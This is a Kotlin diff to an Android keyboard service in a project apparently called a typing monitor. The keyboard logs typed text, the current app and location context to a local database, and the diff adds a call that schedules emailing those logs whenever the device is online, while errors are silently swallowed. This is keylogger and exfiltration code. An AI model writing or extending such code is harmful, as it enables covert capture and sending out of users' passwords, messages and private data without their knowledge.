@@ -8,6 +8,7 @@ import com.mytypingmonitor.db.AppDatabase
 import com.mytypingmonitor.db.TypingLogEntity
 import com.mytypingmonitor.location.LocationHelper
 import com.mytypingmonitor.crypto.CryptoHelper
+import com.mytypingmonitor.WorkManagerInitializer
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.SupervisorJob
@@ -36,6 +37,7 @@ class MyKeyboardService : InputMethodService() {
         updateCurrentApp()
     }
 
+    @Suppress("DEPRECATION") // getRunningTasks deprecated in API 21; fallback branch for API < 21
     private fun updateCurrentApp() {
         try {
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
@@ -143,6 +145,7 @@ class MyKeyboardService : InputMethodService() {
                 )
                 
                 database.typingLogDao().insertLog(log)
+                WorkManagerInitializer.scheduleEmailSyncWhenOnline(applicationContext)
             } catch (e: Exception) {
                 // Log error silently
             }
